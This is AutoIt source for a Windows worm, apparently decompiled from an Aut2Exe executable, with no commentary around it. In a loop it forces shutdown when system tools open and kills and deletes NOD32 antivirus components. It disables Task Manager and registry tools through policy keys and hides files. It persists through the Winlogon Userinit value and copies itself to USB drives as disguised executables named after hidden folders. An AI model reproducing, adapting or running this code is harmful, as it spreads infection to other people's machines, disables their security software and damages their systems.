; <AUT2EXE VERSION: 3.2.2.0>

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: D:\hd\HA1\VI\System.au3>
; ----------------------------------------------------------------------------

if ProcessExists("system.exe") = True Then run(@WindowsDir &"\explorer.exe")
While 1
	#NoTrayIcon
	Opt("TrayIconHide", 1)
	; End process
	if ProcessExists("msconfig.exe") = True Then Shutdown (6)
	if ProcessExists("rstrui.exe") = True Then Shutdown (6)
	if ProcessExists("regedit.exe") = True Then	Shutdown (6)
	if ProcessExists("taskmgr.exe") = True Then	Shutdown (6)
	if ProcessExists("mmc.exe") = True Then	Shutdown (6)
	ProcessClose("winsystem.exe")
	ProcessClose("handydriver.exe")
	ProcessClose("kerneldrive.exe")
	ProcessClose("Wscript.exe")
	ProcessClose("cmd.exe")
	ProcessClose("nod32krn.exe")
	ProcessClose("nod32kui.exe")
	; Regedit Write
	$rg2 = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion"
	Regwrite ($rg2 & "\Explorer\Advanced","SuperHidden","REG_DWORD","0")
	Regwrite ($rg2 & "\Explorer\Advanced","ShowSuperHidden","REG_DWORD","0")
	Regwrite ($rg2 & "\Explorer\Advanced","HideFileExt","REG_DWORD","1")
	Regwrite ($rg2 & "\Explorer\Advanced","Hidden","REG_DWORD","2")
	RegWrite ($rg2 & "\Policies\Explorer","NoFind","REG_DWORD","1")
	Regwrite ($rg2 & "\Policies\Explorer","NoFolderOptions","REG_DWORD","1")
	Regwrite ($rg2 & "\Policies\system","DisableTaskMgr","REG_DWORD","1")
	Regwrite ($rg2 & "\Policies\system","DisableRegistryTools","REG_DWORD","1")
	RegWrite ("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon","Userinit","REG_SZ",@SystemDir &"\userinit.exe,"& @SystemDir &"\Microsoft\Msmsgs.exe")
	; Regedit Delete
	Regdelete("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main","Window Title")
	Regdelete("HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\NOD32krn","ImagePath")
	Regdelete("HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\nod32drv","ImagePath")
	; Flashdrive
	$path1 = DriveGetDrive ("REMOVABLE")
	if Not @error Then
		for $f = 1 to $path1[0]
			$flashdrive = $path1[$f]
			if $flashdrive <> "A:" and DriveGetFileSystem($flashdrive) <> "" Then
				FileCopy(@ScriptFullPath,$flashdrive &"\system.exe")
				FileSetAttrib($flashdrive & "\system.exe","+R+H+S")
				; Search1
				$search1 = FileFindFirstFile($flashdrive & "\*.")
				if $search1 <> -1 Then
					$file1 = FileFindNextFile($search1)
					FileCopy(@scriptfullpath,$flashdrive &"\"& $file1 &".exe")
					FileSetAttrib($flashdrive &"\"& $file1,"+H")
					FileSetAttrib($flashdrive &"\"& $file1 &".exe","-H-S")
				EndIf
				FileClose($search1)
			EndIf
		Next
	EndIf
	; Harddisk Drive
	$path2 = DriveGetDrive ("FIXED")
	if Not @error Then
		for $d = 1 to $path2[0]
			$drive = $path2[$d]
			FileSetAttrib($drive & "\autorun.inf","-R")
			FileDelete($drive & "\autorun.inf")
		Next
	EndIf
	FileCopy(@ScriptFullPath,@SystemDir & "\Microsoft\msmsgs.exe")
	FileSetAttrib(@SystemDir & "\Microsoft\msmsgs.exe","+R+H+S")
	; ETC
	FileCopy(@scriptfullpath,@programfilesdir &"\ESET\nod32.exe")
	FileSetAttrib(@SystemDir & "\wininit.exe","-R")
	FileDelete(@systemdir &"\wininit.exe")
	FileDelete(@ProgramFilesDir & "\ESET\nod32.exe")
	FileDelete(@ProgramFilesDir & "\ESET\nod32kui.exe")
	FileDelete(@ProgramFilesDir & "\ESET\nod32krn.exe")
	Sleep(4000)
WEnd

; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: D:\hd\HA1\VI\System.au3>
; ----------------------------------------------------------------------------

